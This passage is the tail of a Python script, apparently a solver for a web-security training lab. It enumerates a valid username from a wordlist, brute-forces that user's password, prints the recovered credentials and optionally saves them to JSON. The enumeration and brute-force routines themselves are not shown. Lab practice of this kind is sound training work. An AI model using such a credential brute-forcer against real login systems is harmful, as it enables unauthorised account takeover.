    usernames = read_wordlist(args.usernames)
    passwords = read_wordlist(args.passwords)

    # ---- Phase 1: find a valid username ----
    user = enumerate_username(cfg, usernames)
    if not user:
        # Phase 1 failed - exit early so we don't try Phase 2 with no target.
        sys.exit(1)

    # ---- Phase 2: brute-force the password ----
    pw = brute_password(cfg, user, passwords)
    if not pw:
        print(f"{tag_err()} no password matched.")
        sys.exit(1)

    # ---- Final output ----
    print()
    print(f"=== credentials: {user}:{pw} ===")

    # ---- Optional JSON summary on disk ----
    # Writing a structured summary lets you script around the solver:
    # feed `credentials` into a subsequent tool, or grep many runs.
    if cfg.output is not None:
        summary = {
            "lab_url": cfg.base_url,
            "valid_username": user,
            "password": pw,
            "credentials": f"{user}:{pw}",
            "workers": cfg.workers,
            "csrf": cfg.use_csrf,
            "proxy": cfg.proxy,
        }
        # `indent=2` makes it human-readable; drop it for compact output.
        cfg.output.write_text(json.dumps(summary, indent=2) + "\n")
        print(f"{tag_info()} wrote summary to {cfg.output}")


# Standard Python idiom: only run main() if this file is executed
# directly. If it's imported as a module the block is skipped, so the
# imports/functions are available without the side effect of running
# the CLI.
if __name__ == "__main__":
    main()
